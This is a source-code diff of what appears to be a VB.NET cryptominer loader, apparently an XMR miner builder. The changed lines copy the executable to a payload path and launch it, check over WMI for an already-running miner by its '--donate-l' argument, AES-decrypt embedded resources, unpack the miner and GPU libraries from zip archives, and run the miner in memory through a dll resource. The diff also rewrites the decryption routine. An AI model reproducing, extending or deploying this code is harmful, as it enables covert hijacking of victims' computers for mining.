@@ -62,6 +62,7 @@ Public Class Program
                 System.IO.File.WriteAllBytes(PayloadPath, System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName))
                 Thread.Sleep(2 * 1000)
                 BaseFolder()
+                Process.Start(PayloadPath)
                 Environment.Exit(0)
             End If
         Catch ex As Exception
@@ -70,8 +71,7 @@ Public Class Program
 #End If
 
     Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
-        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
-        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
+        Dim MyResource As New Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly())
         Return AES_Decryptor(MyResource.GetObject(Get_))
     End Function
 
@@ -112,7 +112,7 @@ Public Class Program
         End Try
     End Sub
 
-    Public Shared Function KillLastProc()
+    Public Shared Function CheckProc()
         On Error Resume Next
         Dim options As ConnectionOptions = New ConnectionOptions()
         options.Impersonation = ImpersonationLevel.Impersonate
@@ -126,7 +126,6 @@ Public Class Program
 
         For Each retObject As ManagementObject In managementObjectCollection
             If retObject("CommandLine").ToString().Contains("--donate-l") Then
-                Environment.Exit(0)
                 Return True
             End If
         Next
@@ -139,35 +138,16 @@ Public Class Program
         End If
 
         Try
-            Dim x As Byte() = GetTheResource("#xmr")
-            Dim xm As Byte() = New Byte() {}
-            Dim rS As String = ""
-
             BaseFolder()
 
+            Dim rS As String = ""
             Try
-                Try
-                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
-                        For Each entry As ZipArchiveEntry In archive.Entries
-                            If entry.FullName.Contains("xm") Then
-                                Using streamdata As Stream = entry.Open()
-                                    Using ms = New MemoryStream()
-                                        streamdata.CopyTo(ms)
-                                        xm = ms.ToArray
-                                    End Using
-                                End Using
-                            End If
-                        Next
-                    End Using
-                Catch ex As Exception
-                End Try
 
 #If EnableGPU Then
             Dim GPUstr as String = GetGPU
             If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                 Try
-                    Dim libs As Byte() = GetTheResource("#libs")
-                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
+                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#libs")))
                         For Each entry As ZipArchiveEntry In archive.Entries
                             entry.ExtractToFile(Path.Combine(bD, entry.FullName), True)
                         Next
@@ -190,8 +170,26 @@ Public Class Program
             Dim argstr As String = GetString("#ARGSTR") + rS
             argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
             argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
-            KillLastProc()
-            Run(GetTheResource("#dll"), argstr, xm)
+
+            If CheckProc() Then
+                Environment.Exit(0)
+            End If
+
+            Try
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#xmr")))
+                    For Each entry As ZipArchiveEntry In archive.Entries
+                        If entry.FullName.Contains("ri") Then
+                            Using streamdata As Stream = entry.Open()
+                                Using ms = New MemoryStream()
+                                    streamdata.CopyTo(ms)
+                                    Run(GetTheResource("#dll"), argstr, ms.ToArray)
+                                End Using
+                            End Using
+                        End If
+                    Next
+                End Using
+            Catch ex As Exception
+            End Try
         Catch ex As Exception
         End Try
     End Sub
@@ -226,20 +224,20 @@ Public Class Program
 #End If
 
     Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
-        Dim AES As New RijndaelManaged
-        Dim Hash_ As New MD5CryptoServiceProvider
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = CipherMode.ECB
-            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
-            Dim Buffer As Byte() = input
-            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
-        Catch ex As Exception
-        End Try
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
+        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
+        Dim symmetricKey As New RijndaelManaged
+        symmetricKey.KeySize = 256
+        symmetricKey.Mode = CipherMode.CBC
+        Dim decryptor As ICryptoTransform = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes)
+        Using mStream As New MemoryStream()
+            Using cStream As New CryptoStream(mStream, decryptor, CryptoStreamMode.Write)
+                cStream.Write(input, 0, input.Length)
+                cStream.Close()
+            End Using
+            Return mStream.ToArray()
+        End Using
     End Function
 
 End Class
